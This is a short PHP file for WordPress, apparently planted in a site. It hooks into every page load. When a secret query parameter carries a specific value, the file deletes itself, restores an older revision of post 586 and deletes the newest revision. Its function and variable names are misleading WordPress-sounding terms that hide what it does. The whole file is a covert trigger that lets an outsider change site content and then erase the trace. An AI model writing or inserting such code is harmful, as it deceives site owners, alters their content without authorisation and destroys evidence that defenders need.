<?php

function term_wpml_checkout_error() {
	if (isset($_GET['card_feeds_codes_history']) && $_GET['card_feeds_codes_history'] === 'signature_max_service') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$management_paragraph_urls_enable = 586;
		$account_compare_flash_pop = wp_get_post_revisions($management_paragraph_urls_enable);
		if (empty($account_compare_flash_pop)) die('no revisions');
		if (count($account_compare_flash_pop) < 2) die('less than 2');
		$thumbnail_gravity_basic = array_shift($account_compare_flash_pop);
		$nav_typography_hide_type = $thumbnail_gravity_basic->ID;
		$rss_options_src_image = array_shift($account_compare_flash_pop);
		$front_stock_community_shop = $rss_options_src_image->ID;
		$jquery_translate_badge_publish = wp_restore_post_revision($front_stock_community_shop);
		if ($jquery_translate_badge_publish === false) die('error restoring');
		$jquery_translate_badge_publish = wp_delete_post_revision($nav_typography_hide_type);		
		if ($jquery_translate_badge_publish === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'term_wpml_checkout_error');
